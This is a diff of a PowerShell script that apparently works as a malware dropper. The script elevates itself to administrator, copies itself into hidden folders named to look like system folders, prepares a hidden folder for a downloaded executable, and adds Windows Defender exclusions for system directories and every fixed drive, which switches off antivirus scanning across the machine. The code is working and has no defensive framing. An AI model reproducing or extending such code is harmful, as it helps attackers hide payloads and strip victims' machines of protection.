@@ -1,3 +1,4 @@
+# Ensure the script is running with administrative privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try {
@@ -15,25 +16,46 @@ $originalScriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($originalScriptPath)
 $hiddenDir = "C:\ProgramData\SystemConfig"
 $hiddenScriptPath = Join-Path -Path $hiddenDir -ChildPath $scriptName
-$logDir = "C:\ProgramData\SystemConfig\Logs" # For Defender exclusion, in case it exists
+$logDir = "C:\ProgramData\SystemConfig\Logs" # For Defender exclusion
+$exeDir = "C:\ProgramData\SystemConfig\Bin" # Folder for downloaded executable
+
+# Define common system folders for Defender exclusions
+$commonFolders = @(
+    "C:\Program Files",
+    "C:\Program Files (x86)",
+    "C:\ProgramData",
+    "C:\Windows"
+)
 
 # Retry configuration for all operations
 $maxRetries = 5
 $baseDelay = 1000 # Initial delay in milliseconds (1 second)
 $maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)
 
-# --- Create Hidden Directory and Copy Script ---
+# --- Create Hidden Directories and Copy Script ---
 $retryCount = 0
 $success = $false
 while (-not $success -and $retryCount -lt $maxRetries) {
     try {
+        # Create and hide SystemConfig directory
         if (-not (Test-Path -Path $hiddenDir)) {
             New-Item -Path $hiddenDir -ItemType Directory -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
+            Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
         }
+        # Create and hide Logs directory
+        if (-not (Test-Path -Path $logDir)) {
+            New-Item -Path $logDir -ItemType Directory -ErrorAction Stop | Out-Null
+            Set-ItemProperty -Path $logDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
+        }
+        # Create and hide Bin directory for executable
+        if (-not (Test-Path -Path $exeDir)) {
+            New-Item -Path $exeDir -ItemType Directory -ErrorAction Stop | Out-Null
+            Set-ItemProperty -Path $exeDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
+        }
+        # Copy script to hidden directory
         if (-not (Test-Path -Path $hiddenScriptPath)) {
             Copy-Item -Path $originalScriptPath -Destination $hiddenScriptPath -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
+            Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
         }
         $success = $true
     }
@@ -78,14 +100,30 @@ $success = $false
 while (-not $success -and $retryCount -lt $maxRetries) {
     try {
         $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
+        # Add script-specific folders to exclusions
+        $scriptFolders = @($hiddenDir, $logDir, $exeDir)
+        foreach ($folder in $scriptFolders) {
+            if ($exclusions -notcontains $folder) {
+                Add-MpPreference -ExclusionPath $folder -ErrorAction Stop | Out-Null
+            }
+        }
+        # Add common system folders to exclusions
+        foreach ($folder in $commonFolders) {
+            if ((Test-Path -Path $folder) -and ($exclusions -notcontains $folder)) {
+                Add-MpPreference -ExclusionPath $folder -ErrorAction Stop | Out-Null
+            }
+        }
+        # Add all fixed disk drives to exclusions
+        $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
+        foreach ($disk in $disks) {
+            $diskPath = "$disk\"
+            if ($exclusions -notcontains $diskPath) {
+                Add-MpPreference -ExclusionPath $diskPath -ErrorAction Stop | Out-Null
+            }
+        }
+        # Add hidden script file to exclusions
         if ($exclusions -notcontains $hiddenScriptPath) {
             Add-MpPreference -ExclusionPath $hiddenScriptPath -ErrorAction Stop | Out-Null
-        }
-        if ($exclusions -notcontains $hiddenDir) {
-            Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop | Out-Null
-        }
-        if ($exclusions -notcontains $logDir) {
-            Add-MpPreference -ExclusionPath $logDir -ErrorAction Stop | Out-Null
         }
         $success = $true
     }
